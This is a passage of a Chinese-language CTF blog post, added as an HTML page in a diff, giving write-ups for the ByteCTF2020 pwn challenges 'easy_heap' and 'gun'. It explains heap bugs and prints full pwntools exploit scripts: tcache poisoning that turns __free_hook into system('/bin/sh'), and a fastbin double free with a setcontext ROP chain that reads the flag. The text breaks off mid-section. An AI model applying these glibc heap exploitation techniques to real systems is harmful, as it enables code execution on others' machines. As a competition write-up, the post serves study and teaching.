@@ -1,0 +1,1143 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="- 一只啥都想学又啥都不会的菜鸡 -">
+  <meta name="author" content="arttnba3">
+  <meta name="keywords" content="">
+  <title>【CTF.0X01】ByteCTF2020-Pwn WP - arttnba3&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.6.2/gitalk.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 80vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>arttnba3's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+                rss
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('https://i.loli.net/2020/11/23/CJTvHar1LYmtqjn.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-23 02:04" pubdate>
+        2020年11月23日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      55
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">【CTF.0X01】ByteCTF2020-Pwn WP</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年2月21日 凌晨
+                
+              </p>
+            
+            <div class="markdown-body" id="post-body">
+              <p>我怎么这么菜.jpg</p>
+<a id="more"></a>
+
+<p>[TOC]</p>
+<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>ByteCTF是由字节跳动办的CTF，同时也是是字节跳动“安全范儿”高校挑战赛的一部分，作为baby pwner有幸和协会的师傅们代表L-team一起去北京参加了最后的总决赛（虽然说我好像没发挥啥作用Or2</p>
+<p>题目的质量都很高，以及逆向量十分巨大，比赛当天把我给看晕了（当然主要还是因为我太菜了Or2</p>
+<h1 id="0x01-线上赛-CTF-PWN"><a href="#0x01-线上赛-CTF-PWN" class="headerlink" title="0x01.线上赛 - CTF -PWN"></a>0x01.线上赛 - CTF -PWN</h1><h2 id="0x00-easy-heap-null-by-any-address-tcache-poisoning"><a href="#0x00-easy-heap-null-by-any-address-tcache-poisoning" class="headerlink" title="0x00.easy_heap - null by any address + tcache poisoning"></a>0x00.easy_heap - null by any address + tcache poisoning</h2><p><a href="/download/bytectf2020/pwn/easyheap/easyheap" title="点击此处下载原题">点击下载-easyheap</a></p>
+<p><a href="/download/bytectf2020/pwn/easyheap/libc-2.31.so" title="点击此处下载原题">点击下载-libc-2.31.so</a></p>
+<p>惯例的堆题签到题，惯例的<code>checksec</code>，保护全开</p>
+<p><img src="https://i.loli.net/2020/11/23/2btk4Tjmf3aPyur.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>拖入IDA进行分析（部分函数、变量经重命名）</p>
+<p><img src="https://i.loli.net/2020/11/23/1aFsAWTvElyizPw.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>不难看出，该程序有着<strong>分配、释放、打印堆块</strong>的功能，<strong>且最多只能分配8个堆块</strong>，空间有一丶丶紧张</p>
+<p><img src="https://i.loli.net/2020/11/23/iqkFXswJcmLatyp.png" srcset="/img/loading.gif" alt="image.png"></p>
+<h3 id="漏洞：任意地址写0"><a href="#漏洞：任意地址写0" class="headerlink" title="漏洞：任意地址写0"></a>漏洞：任意地址写0</h3><p>我们不难发现在分配堆块的函数中存在着任意地址写0的漏洞</p>
+<p><img src="https://i.loli.net/2020/11/23/CX4VewdmjJFHWhZ.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>利用这个漏洞我们便可以构造<strong>tcache poisoning</strong>：free掉几个堆块进tcache后<strong>改写第一个堆块的fd指针指向自身</strong>（这里我们需要分到一个自身的fd的地址的高字节为’\x00’的堆块）</p>
+<p>同时，我们可以<strong>将一个堆块送入unsorted bin后切割出一个小堆块并打印，获得libc的基址</strong></p>
+<p>需要注意的是*(ptr + size -1)写0的操作、我们的输入、unsortedbin的分割过程<strong>都会破坏分割出来的这个小堆块上所储存的内容，</strong>，故我们需要将这个0写到别的不会破坏堆结构的地方，同时我们的size应当尽量小、输入应当尽量少、且贴合原chunk内容，以<strong>保证我们能够获得正确的libc基址</strong></p>
+<p>我们先分配8个大小为0x91的chunk并释放，之后尝试分割出一个最小的chunk（malloc(1)，得到只清空了一个字节的0x21大小的chunk），gdb调试发现main_arena + 96的地址的最后一个字节<strong>都是</strong><code>\xe0</code>，故我们仅输入一个<code>\xe0</code>字节即可</p>
+<p><img src="https://i.loli.net/2020/11/23/OgBcK9QxY86FZUs.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>gdb调试发现这个小chunk保存的地址是<strong>main_arena + 352</strong>的地址，输出即可获得libc基址</p>
+<p><img src="https://i.loli.net/2020/11/23/ON92YChTixUtZVL.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>接下来<strong>利用任意地址写0构造tcache poisoning</strong>：分配出FD所在地址末字节为0的chunk，free进tcache，之后用<strong>任意地址写0使其FD指向自己的FD</strong>即可</p>
+<p><img src="https://i.loli.net/2020/11/23/8lbUyHrPIY236Xd.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>最后构造fake chunk改写<code>__free_hook</code>为<code>system</code>后释放一个内容为<code>&quot;/bin/sh&quot;</code>的chunk即可get shell</p>
+<p>构造exp如下：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-comment">#context.log_level = &#x27;DEBUG&#x27;</span>
+p = process(<span class="hljs-string">&quot;./easyheap&quot;</span>)
+libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span>(<span class="hljs-params">command:int</span>):</span>
+    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>)
+    p.sendline(str(command).encode())
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">size:int, content</span>):</span>
+    cmd(<span class="hljs-number">1</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)
+    p.sendline(str(size).encode())
+    p.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)
+    p.sendline(content)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">newWithZero</span>(<span class="hljs-params">zero_location:int, size:int, content</span>):</span>
+    cmd(<span class="hljs-number">1</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)
+    p.sendline(str(zero_location).encode())
+    p.recvuntil(<span class="hljs-string">b&quot;Invalid size.&quot;</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)
+    p.sendline(str(size).encode())
+    p.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)
+    p.sendline(content)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">index:int</span>):</span>
+    cmd(<span class="hljs-number">2</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)
+    p.sendline(str(index).encode())
+    p.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index:int</span>):</span>
+    cmd(<span class="hljs-number">3</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)
+    p.sendline(str(index).encode())
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>
+    <span class="hljs-comment"># fill the tcache</span>
+    log.info(<span class="hljs-string">&quot;Start filling the tcache&quot;</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
+        new(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
+        delete(<span class="hljs-number">7</span> - i)
+
+    <span class="hljs-comment"># leak the libc addr</span>
+    log.info(<span class="hljs-string">&quot;Start leaking the libc addr&quot;</span>)
+    delete(<span class="hljs-number">0</span>)
+    newWithZero(<span class="hljs-number">0x100</span>, <span class="hljs-number">0x1</span>, <span class="hljs-string">b&#x27;\xe0&#x27;</span>) <span class="hljs-comment"># idx 0</span>
+    dump(<span class="hljs-number">0</span>)
+    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">352</span>
+    __malloc_hook = main_arena - <span class="hljs-number">0x10</span>
+    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]
+    log.info(<span class="hljs-string">&quot;Libc addr:&quot;</span> + str(hex(libc_base)))
+
+    <span class="hljs-comment"># tcache poisoning</span>
+    log.info(<span class="hljs-string">&quot;Start tcache poisoning&quot;</span>)
+    new(<span class="hljs-number">0x70</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 1</span>
+    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 2, the former chunk left in unsorted-bin cut</span>
+    new(<span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 3</span>
+    new(<span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 4</span>
+    new(<span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 5</span>
+
+    delete(<span class="hljs-number">3</span>)
+    delete(<span class="hljs-number">5</span>)
+    delete(<span class="hljs-number">4</span>)
+
+    newWithZero(<span class="hljs-number">-0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 3</span>
+    new(<span class="hljs-number">0x50</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])) <span class="hljs-comment"># idx 4</span>
+    new(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>) <span class="hljs-comment"># idx 5</span>
+    new(<span class="hljs-number">0x50</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])) <span class="hljs-comment"># idx 6, fake chunk</span>
+
+    <span class="hljs-comment"># get the shell</span>
+    delete(<span class="hljs-number">5</span>) <span class="hljs-comment"># system(&quot;/bin/sh&quot;)</span>
+    p.interactive()
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    exp()</code></pre>
+
+<p>运行，成功getshell</p>
+<p><img src="https://i.loli.net/2020/11/23/RO8Mm4FKvg1WCYV.png" srcset="/img/loading.gif" alt="image.png"></p>
+<h2 id="0x01-gun-Use-After-Free-fastbin-double-free-ORW"><a href="#0x01-gun-Use-After-Free-fastbin-double-free-ORW" class="headerlink" title="0x01.gun - Use After Free + fastbin double free + ORW"></a>0x01.gun - Use After Free + fastbin double free + ORW</h2><blockquote>
+<p><del>这道题我的IDA逆出来是一堆的shit…但是看别人的wp里IDA逆出来的东西怎么都这么正常…Orz</del></p>
+<p>换了IDA7.5，至少能看懂程序逻辑了XD</p>
+</blockquote>
+<p><a href="/download/bytectf2020/pwn/gun/gun" title="点击此处下载原题">点击下载-gun</a></p>
+<p><a href="/download/bytectf2020/pwn/gun/libc-2.31.so" title="点击此处下载原题">点击下载-libc-2.31.so</a></p>
+<p>惯例的<code>checksec</code>，保护全开（<del>大比赛的堆题好像都是保护全开，已经没有checksec的必要了</del>）</p>
+<p><img src="https://i.loli.net/2020/12/08/Kaw5yg3udnEVMBp.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>拖入IDA进行分析<del>，IDA分析出一坨shit</del></p>
+<p>符号表扣光，啥都看不出（悲）</p>
+<p><img src="https://i.loli.net/2020/12/08/H5EqnWwVeCjIKh6.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>seccomp限制了一堆东西，琢磨着应该是拿不到shell了，应该还是只能走orw拿弗莱格</p>
+<p><img src="https://i.loli.net/2020/12/08/EmitBpFlnNKP7X9.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>程序模拟了一把枪，能够射出、装载、购买子弹，其中子弹对应的就是chunk，购买子弹对应malloc</p>
+<p><img src="https://i.loli.net/2021/02/05/wxq2SRUBbMs5mcl.png" srcset="/img/loading.gif"></p>
+<p>最多能够分配14个堆块，空间充足（x</p>
+<p><img src="https://i.loli.net/2021/02/05/94rFSObq7T3h6zI.png" srcset="/img/loading.gif"></p>
+<p>在<code>buy()</code>函数中限制了chunk的size为0x10~0x500（似乎没什么用）</p>
+<p><img src="https://i.loli.net/2021/02/06/eqmvJSHc7I3YDin.png" srcset="/img/loading.gif"></p>
+<p>其中<code>qword_4070</code>存放的是子弹槽对应标志位，0为该槽子弹已被射出（free），1为该槽已被使用（存放有chunk指针），2为该槽子弹已被装载（链入”弹匣“单向链表中）</p>
+<p>综合起来我们不难看出其使用一个结构体来表示一个“子弹”</p>
+<pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">INTERNAL_BULLET_</span></span>
+<span class="hljs-class">&#123;</span>
+    <span class="hljs-keyword">char</span> * name;
+    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> flag;
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">INTERNAL_BULLET_</span> * <span class="hljs-title">next_bullet</span>;</span>
+&#125;bullet;</code></pre>
+
+<p>其中<code>成员name</code>储存的便是chunk指针</p>
+<p>在<code>load()</code>函数中会使用头插法构建”弹匣“（单向链表），其中会使用chunk的bk指针存储原链表中头结点</p>
+<p><img src="https://i.loli.net/2021/02/05/MbjAFZzscO56dhE.png" srcset="/img/loading.gif"></p>
+<h3 id="漏洞：Use-After-Free"><a href="#漏洞：Use-After-Free" class="headerlink" title="漏洞：Use After Free"></a>漏洞：Use After Free</h3><p>在<code>shoot()</code>函数中会依次将”弹匣“链表上的”子弹”释放，随后会将该子弹的flag置0，<strong>但是没有清空其next_chunk指针，存在Use After Free漏洞，对于子弹链表的不严格检测可以导致double free</strong></p>
+<p>同时shoot函数还整合了打印堆块内容的功能，利用这个功能我们可以通过再分配后二次释放的方式通过chunk上残留指针泄露栈基址与堆基址</p>
+<p><img src="https://i.loli.net/2021/02/06/7FxncCbzOGshmBe.png" srcset="/img/loading.gif"></p>
+<p>由于题目所给的libc版本为2.31，添加了对tcache key的检测，无法直接在tcache内进行double free，故考虑<strong>先填满tcache后在fastbin内double free，后通过stash机制清空tcache使得fastbin内形如A-&gt;B-&gt;A的chunk倒入tcache中，实现任意地址写</strong>，这种做法<strong>不需要通过fastbin的size检查</strong></p>
+<p>同时由于程序本身限制了系统调用，我们只能通过orw读取flag</p>
+<p>考虑通过<code>setcontext()</code>中的gadget进行控制寄存器，同时我们还需要控制rdx寄存器，考虑劫持__free_hook后通过libc中如下gadget控制rdx后跳转至setcontext函数内部：</p>
+<p><img src="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png" srcset="/img/loading.gif"></p>
+<p>最后通过setcontext构建的rop链orw即可，使用pwntools中的<code>SigreturnFrame()</code>可以快速构造 <code>ucontext_t</code>结构体 </p>
+<p>构造exp如下：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
+<span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span>
+
+p = process(<span class="hljs-string">&#x27;./gun&#x27;</span>)
+e = ELF(<span class="hljs-string">&#x27;./gun&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span>(<span class="hljs-params">command:int</span>):</span>
+    p.recvuntil(<span class="hljs-string">b&quot;Action&gt; &quot;</span>)
+    p.sendline(str(command).encode())
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shoot</span>(<span class="hljs-params">times:int</span>):</span>
+    cmd(<span class="hljs-number">1</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Shoot time: &quot;</span>)
+    p.sendline(str(times).encode())
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load</span>(<span class="hljs-params">index:int</span>):</span>
+    cmd(<span class="hljs-number">2</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Which one do you want to load?&quot;</span>)
+    p.sendline(str(index).encode())
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">buy</span>(<span class="hljs-params">size:int, content</span>):</span>
+    cmd(<span class="hljs-number">3</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Bullet price: &quot;</span>)
+    p.sendline(str(size).encode())
+    p.recvuntil(<span class="hljs-string">b&quot;Bullet Name: &quot;</span>)
+    p.sendline(content)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>
+    p.sendline(<span class="hljs-string">b&quot;arttnba3&quot;</span>)
+
+    buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 0</span>
+    buy(<span class="hljs-number">0x500</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 1</span>
+    buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 2</span>
+
+    <span class="hljs-comment"># leak the libc addr</span>
+    load(<span class="hljs-number">1</span>)
+    shoot(<span class="hljs-number">1</span>)
+    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;&#x27;</span>) <span class="hljs-comment"># idx 1</span>
+    load(<span class="hljs-number">1</span>)
+    shoot(<span class="hljs-number">1</span>)
+    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">1168</span>
+    __malloc_hook = main_arena - <span class="hljs-number">0x10</span>
+    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]
+    log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span> + hex(libc_base))
+
+    <span class="hljs-comment"># leak the heap addr</span>
+    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;AAAAAAAAAAAAAAAA&#x27;</span>) <span class="hljs-comment"># idx 1</span>
+    load(<span class="hljs-number">1</span>)
+    shoot(<span class="hljs-number">1</span>)
+    p.recvuntil(<span class="hljs-string">b&#x27;AAAAAAAAAAAAAAAA&#x27;</span>)
+    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+    log.info(<span class="hljs-string">&#x27;heap addr leak: &#x27;</span> + hex(heap_leak))
+    heap_base = heap_leak &amp; <span class="hljs-number">0xfffffffff000</span>
+    log.success(<span class="hljs-string">&#x27;heap base: &#x27;</span> + hex(heap_base))
+
+    <span class="hljs-comment"># construct the fake_frame on heap</span>
+    fake_frame_addr = heap_base + <span class="hljs-number">0x310</span> + <span class="hljs-number">0x10</span>
+    fake_frame = SigreturnFrame()
+    fake_frame[<span class="hljs-string">&#x27;uc_stack.ss_size&#x27;</span>] = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span>
+    fake_frame.rdi = <span class="hljs-number">0</span>
+    fake_frame.rsi = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
+    fake_frame.rdx = <span class="hljs-number">0x200</span>
+    fake_frame.rsp = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
+    fake_frame.rip = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]
+
+    load(<span class="hljs-number">0</span>)
+    shoot(<span class="hljs-number">1</span>)
+    buy(<span class="hljs-number">0x100</span>, bytes(fake_frame))
+
+    <span class="hljs-comment"># tcache poisoning with fastbin double free</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):
+        buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)
+    load(<span class="hljs-number">9</span>)
+    load(<span class="hljs-number">10</span>)
+    shoot(<span class="hljs-number">2</span>)
+    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 9</span>
+    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 10</span>
+    load(<span class="hljs-number">1</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):
+        load(<span class="hljs-number">3</span> + i)
+    shoot(<span class="hljs-number">7</span>)
+    load(<span class="hljs-number">10</span>)
+    load(<span class="hljs-number">9</span>)
+    shoot(<span class="hljs-number">3</span>) <span class="hljs-comment"># double free in fastbin</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
+        buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># clear the tcache</span>
+    buy(<span class="hljs-number">0x20</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])) <span class="hljs-comment"># idx 9</span>
+    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;./flag\x00&#x27;</span>) <span class="hljs-comment"># idx 10, which we use to store the flag</span>
+    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 11, overlapping chunk with idx 9</span>
+    buy(<span class="hljs-number">0x20</span>, p64(libc_base + <span class="hljs-number">0x154930</span>)) <span class="hljs-comment"># idx12, our fake chunk on __free_hook</span>
+
+    <span class="hljs-comment"># construct the setcontext with gadget chain</span>
+    flag_addr = heap_base + <span class="hljs-number">0x570</span> + <span class="hljs-number">0x10</span>
+
+    payload = p64(<span class="hljs-number">0</span>) + p64(fake_frame_addr)<span class="hljs-comment"># rdi + 8 for the rdx, we set it to the addr of the fake frame</span>
+
+    buy(<span class="hljs-number">0x100</span>, payload) <span class="hljs-comment"># idx 13</span>
+
+    <span class="hljs-comment"># construct the orw rop chain</span>
+    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()
+    pop_rsi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rsi ; ret&#x27;</span>)).__next__()
+    pop_rdx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdx ; ret&#x27;</span>)).__next__()
+    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).__next__()
+
+    orw = <span class="hljs-string">b&#x27;&#x27;</span>
+    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="hljs-number">4</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>])
+    orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])
+    orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])
+
+    <span class="hljs-comment"># get the flag</span>
+    load(<span class="hljs-number">13</span>)
+    shoot(<span class="hljs-number">1</span>)
+    p.sendline(orw)
+    p.interactive()
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    exp()</code></pre>
+
+<p>运行即可获得flag</p>
+<p><img src="https://i.loli.net/2021/02/10/CNypQMasthTbzK9.png" srcset="/img/loading.gif"></p>
+<blockquote>
